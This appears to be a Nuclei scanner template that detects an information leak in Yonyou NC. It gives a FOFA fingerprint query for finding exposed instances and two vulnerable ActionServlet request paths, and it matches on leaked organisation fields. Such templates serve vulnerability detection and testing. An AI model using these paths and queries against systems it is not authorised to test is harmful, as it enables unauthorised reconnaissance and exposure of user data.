id: yongyou-nc-userinfo-leak-and-file-upload

info:
  name: Yongyou NC Userinfo Leak And File Upload
  author: zp857
  severity: high
  tags: yongyou-nc,fileupload,leak
  metadata:
    fofa-query: 'body="UClient" || body="用友" || body="YONYOU" || body="img/logo_small.ico" || body="产品登录界面" || body="ufida_nc.png"'

requests:
  - method: GET
    path:
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID="
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.login.LoginAction"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "包含子节点"
          - "单位编码"

      - type: status
        status:
          - 200